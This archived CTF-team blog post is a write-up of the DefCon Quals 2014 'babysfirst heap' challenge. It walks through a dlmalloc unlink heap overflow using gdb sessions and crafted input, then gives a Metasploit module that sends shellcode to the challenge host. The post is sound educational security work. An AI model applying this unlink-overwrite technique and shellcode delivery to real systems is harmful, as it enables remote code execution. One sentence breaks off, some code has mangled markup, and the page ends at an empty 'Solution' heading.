
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>DefCon Quals 2014 - babysfirst heap - CaptchaFlag CTF Team</title>
  <meta name="author" content="Captchaflag">

  
  <meta name="description" content="Analysis 1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50 &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-babysfirst-heap/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="CaptchaFlag CTF Team" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-37376887-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">CaptchaFlag CTF Team</a></h1>
  
    <h2>Blog by the Captchaflag CTF Team</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:www.captchaflag.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">DefCon Quals 2014 - Babysfirst Heap</h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-05-23T13:27:00-04:00" pubdate data-updated="true">May 23<span>rd</span>, 2014</time>
        
         | <a href="#disqus_thread">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><h2>Analysis</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to your first heap overflow...
</span><span class='line'>I am going to allocate 20 objects...
</span><span class='line'>Using Dougle Lee Allocator 2.6.1...
</span><span class='line'>Goodluck!
</span><span class='line'>
</span><span class='line'>Exit function pointer is at 804C8AC address.
</span><span class='line'>[ALLOC][loc=8ED2008][size=1246]
</span><span class='line'>[ALLOC][loc=8ED24F0][size=1121]
</span><span class='line'>[ALLOC][loc=8ED2958][size=947]
</span><span class='line'>[ALLOC][loc=8ED2D10][size=741]
</span><span class='line'>[ALLOC][loc=8ED3000][size=706]
</span><span class='line'>[ALLOC][loc=8ED32C8][size=819]
</span><span class='line'>[ALLOC][loc=8ED3600][size=673]
</span><span class='line'>[ALLOC][loc=8ED38A8][size=1004]
</span><span class='line'>[ALLOC][loc=8ED3C98][size=952]
</span><span class='line'>[ALLOC][loc=8ED4058][size=755]
</span><span class='line'>[ALLOC][loc=8ED4350][size=260]
</span><span class='line'>[ALLOC][loc=8ED4458][size=877]
</span><span class='line'>[ALLOC][loc=8ED47D0][size=1245]
</span><span class='line'>[ALLOC][loc=8ED4CB8][size=1047]
</span><span class='line'>[ALLOC][loc=8ED50D8][size=1152]
</span><span class='line'>[ALLOC][loc=8ED5560][size=1047]
</span><span class='line'>[ALLOC][loc=8ED5980][size=1059]
</span><span class='line'>[ALLOC][loc=8ED5DA8][size=906]
</span><span class='line'>[ALLOC][loc=8ED6138][size=879]
</span><span class='line'>[ALLOC][loc=8ED64B0][size=823]
</span><span class='line'>Write to object [size=260]:
</span><span class='line'>Copied 16 bytes.
</span><span class='line'>[FREE][address=8ED2008]
</span><span class='line'>[FREE][address=8ED24F0]
</span><span class='line'>[FREE][address=8ED2958]
</span><span class='line'>[FREE][address=8ED2D10]
</span><span class='line'>[FREE][address=8ED3000]
</span><span class='line'>[FREE][address=8ED32C8]
</span><span class='line'>[FREE][address=8ED3600]
</span><span class='line'>[FREE][address=8ED38A8]
</span><span class='line'>[FREE][address=8ED3C98]
</span><span class='line'>[FREE][address=8ED4058]
</span><span class='line'>[FREE][address=8ED4350]
</span><span class='line'>[FREE][address=8ED4458]
</span><span class='line'>[FREE][address=8ED47D0]
</span><span class='line'>[FREE][address=8ED4CB8]
</span><span class='line'>[FREE][address=8ED50D8]
</span><span class='line'>[FREE][address=8ED5560]
</span><span class='line'>[FREE][address=8ED5980]
</span><span class='line'>[FREE][address=8ED5DA8]
</span><span class='line'>[FREE][address=8ED6138]
</span><span class='line'>[FREE][address=8ED64B0]
</span><span class='line'>Did you forget to read the flag with your shellcode?
</span><span class='line'>Exiting</span></code></pre></td></tr></table></div></figure>

<p>Presumably a heap overflow. It appears as if we are going to write to the buffer that is allocated for 260 bytes, and presumably can overwrite into the next heap buffer. Looking at the addresses and sizes provided, all of the buffers are bumped up against one another. An uncontrolled write will allow us to overwrite heap metadata of another block, which when freed will attempt to unlink and coalesce. Let&#8217;s play around with the inputs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;AAAABBBB&quot;+&quot;C&quot;*252+&quot;\x00\x00\x00\x00&quot;&#39;</span> &gt; input
</span><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>gdb babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run &lt; input
</span><span class='line'>Welcome to your first heap overflow...
</span><span class='line'>I am going to allocate 20 objects...
</span><span class='line'>Using Dougle Lee Allocator 2.6.1...
</span><span class='line'>Goodluck!
</span><span class='line'>
</span><span class='line'>Exit <span class="k">function </span>pointer is at 804C8AC address.
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804D008<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1246<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804D4F0<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1121<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804D958<span class="o">][</span><span class="nv">size</span><span class="o">=</span>947<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804DD10<span class="o">][</span><span class="nv">size</span><span class="o">=</span>741<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E000<span class="o">][</span><span class="nv">size</span><span class="o">=</span>706<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E2C8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>819<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E600<span class="o">][</span><span class="nv">size</span><span class="o">=</span>673<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E8A8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1004<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804EC98<span class="o">][</span><span class="nv">size</span><span class="o">=</span>952<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F058<span class="o">][</span><span class="nv">size</span><span class="o">=</span>755<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F350<span class="o">][</span><span class="nv">size</span><span class="o">=</span>260<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F458<span class="o">][</span><span class="nv">size</span><span class="o">=</span>877<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F7D0<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1245<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804FCB8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1047<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>80500D8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1152<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8050560<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1047<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8050980<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1059<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8050DA8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>906<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8051138<span class="o">][</span><span class="nv">size</span><span class="o">=</span>879<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>80514B0<span class="o">][</span><span class="nv">size</span><span class="o">=</span>823<span class="o">]</span>
</span><span class='line'>Write to object <span class="o">[</span><span class="nv">size</span><span class="o">=</span>260<span class="o">]</span>:
</span><span class='line'>Copied 265 bytes.
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804D008<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804D4F0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804D958<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804DD10<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E000<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E2C8<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E600<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E8A8<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804EC98<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804F058<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x080493f6 in free <span class="o">(</span><span class="nv">mem</span><span class="o">=</span>0x804f058<span class="o">)</span> at malloc.c:1259
</span><span class='line'>1259    in malloc.c
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x /i <span class="nv">$eip</span>
</span><span class='line'><span class="o">=</span>&gt; 0x80493f6 &lt;free+273&gt;:   mov    %edx,0x8<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> info reg
</span><span class='line'>eax            0x41414141   1094795585
</span><span class='line'>ecx            0x804d004    134533124
</span><span class='line'>edx            0x42424242   1111638594
</span></code></pre></td></tr></table></div></figure>

<p>There&#8217;s a controlled 4-byte write. In order to gain execution, we can overwrite
the GOT (targeting printf(), which is repeatedly called in between freeing
buffers) or target the do_exit() function pointer which they provide to us.</p>

<p>Let&#8217;s target printf():
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>objdump -R babyfirst-heap<em>33ecf0ad56efc1b322088f95dd98827c  | grep <span class="nb">printf</span>
</span><span class='line'>0804c004 R</em>386<em>JUMP</em>SLOT   <span class="nb">printf</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Also, notice that this is occuring during the free of 0x804F058, the block prior to the one allocated for 260 bytes. Since the write is accessing eax+8, we need to subtract 8 from our target address. We can overwrite the GOT entry for printf to point to our shellcode on the heap. For this example, I&#8217;ll replace &quot;AAAA&quot; with printf() GOT - 8, &quot;BBBB&quot; with heap buffer + 8 (to skip our addresses), and replace &quot;C&quot; with &quot;\xCC&quot;, for a breakpoint.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;\xfc\xbf\x04\x08&quot;+&quot;\x58\xf3\x04\x08&quot;+&quot;\xCC&quot;*252+&quot;\x00\x00\x00\x00&quot;&#39;</span> &gt; input
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run &lt; input
</span><span class='line'>...
</span><span class='line'>Program received signal SIGTRAP, Trace/breakpoint trap.
</span><span class='line'>0x0804f359 in ?? <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x /5i <span class="nv">$eip</span>
</span><span class='line'><span class="o">=</span>&gt; 0x804f359:   int3
</span><span class='line'>   0x804f35a:   int3
</span><span class='line'>   0x804f35b:   int3
</span><span class='line'>   0x804f35c:   cld
</span><span class='line'>   0x804f35d:   mov    <span class="nv">$0xcccc0804</span>,%edi
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x /16bx <span class="nv">$eip</span>
</span><span class='line'>0x804f359:  0xcc    0xcc    0xcc    0xfc    0xbf    0x04    0x08    0xcc
</span><span class='line'>0x804f361:  0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc
</span></code></pre></td></tr></table></div></figure>

<p>Great! We hit our breakpoint. However, notice that 0x0804bffc has been written here. That&#8217;s due to unlink() fixing up both BK-&gt;FD and FD-&gt;BK. we can avoid this by putting a simple &#8216;jmp&#8217; in our payload. For example, &#8216;jmp 12&#8217; corresponds to &#8216;\xeb\x0c&#8217;.</p>

<h2>Code</h2>

<p>Note, during the competition, this code was used for exploiting the service and
retrieving the key. It targeted overwriting the do_exit() function pointer, which resulted in all buffers being freed prior to getting code execution. This required safely
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
</span><span class='line'>  <span class="no">Rank</span> <span class="o">=</span> <span class="no">GreatRanking</span>
</span><span class='line'>
</span><span class='line'>  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
</span><span class='line'>    <span class="k">super</span><span class="p">(</span><span class="n">update<em>info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;heap&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Description&#39;</span>    <span class="o">=&gt;</span> <span class="sx">%q{</span>
</span><span class='line'><span class="sx">            heap overflow</span>
</span><span class='line'><span class="sx">      }</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;stacks0n&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Platform&#39;</span>       <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;linux&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Arch&#39;</span>           <span class="o">=&gt;</span> <span class="no">ARCH</em>X86</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Targets&#39;</span>        <span class="o">=&gt;</span> <span class="o">[</span> <span class="o">[</span> <span class="s1">&#39;Automatic&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="p">}</span>  <span class="o">]</span><span class="p">,</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">register<em>options</span><span class="p">(</span>
</span><span class='line'>      <span class="o">[</span>
</span><span class='line'>                <span class="no">Opt</span><span class="o">::</span><span class="no">RHOST</span><span class="p">(</span><span class="s1">&#39;babyfirst-heap</em>33ecf0ad56efc1b322088f95dd98827c.2014.shallweplayaga.me&#39;</span><span class="p">),</span>
</span><span class='line'>        <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">4088</span><span class="p">)</span>
</span><span class='line'>      <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">exploit</span>
</span><span class='line'>    <span class="n">connect</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">print</span> <span class="n">data</span>
</span><span class='line'>        <span class="n">addr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>        <span class="c1"># [ALLOC][loc=874F058][size=755]</span>
</span><span class='line'>        <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">elem</span><span class="o">|</span>
</span><span class='line'>          <span class="k">if</span> <span class="n">elem</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\</span><span class="s2">[ALLOC</span><span class="se">\</span><span class="s2">]</span><span class="se">\</span><span class="s2">[loc=(.<em>)</span><span class="se">\</span><span class="s2">]</span><span class="se">\</span><span class="s2">[size=(.</em>)</span><span class="se">\</span><span class="s2">]&quot;</span><span class="p">)</span>
</span><span class='line'>            <span class="c1"># size</span>
</span><span class='line'>            <span class="k">if</span> <span class="vg">$2</span> <span class="o">==</span> <span class="s2">&quot;260&quot;</span>
</span><span class='line'>              <span class="n">addr</span> <span class="o">=</span> <span class="vg">$1</span>
</span><span class='line'>              <span class="n">addr</span> <span class="o">=</span> <span class="o">[</span><span class="n">addr</span><span class="o">.</span><span class="n">to<em>i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;V&quot;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">end</span>
</span><span class='line'>          <span class="k">end</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="nb">p</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xa4\xc8\x04\x08</span><span class="s2">&quot;</span> <span class="c1"># do</em>exit() - 8</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="n">addr</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xeb\x0C</span><span class="s2">&quot;</span> <span class="c1"># jmp 12</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o"><em></span><span class="mi">16</span> <span class="c1"># why not?</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o"></em></span> <span class="p">(</span><span class="mi">260</span> <span class="o">-</span> <span class="nb">p</span><span class="o">.</span><span class="n">size</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x01\x00\x00\x00</span><span class="s2">&quot;</span> <span class="c1"># overwrite the size block</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xa4\xc8\x04\x08</span><span class="s2">&quot;</span> <span class="c1"># do<em>exit() - 8</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="n">addr</span>
</span><span class='line'>        <span class="n">print</em>status</span> <span class="nb">p</span><span class="o">.</span><span class="n">inspect</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1"># send the payload</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">p</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">handler</span>
</span><span class='line'>    <span class="n">disconnect</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>Solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
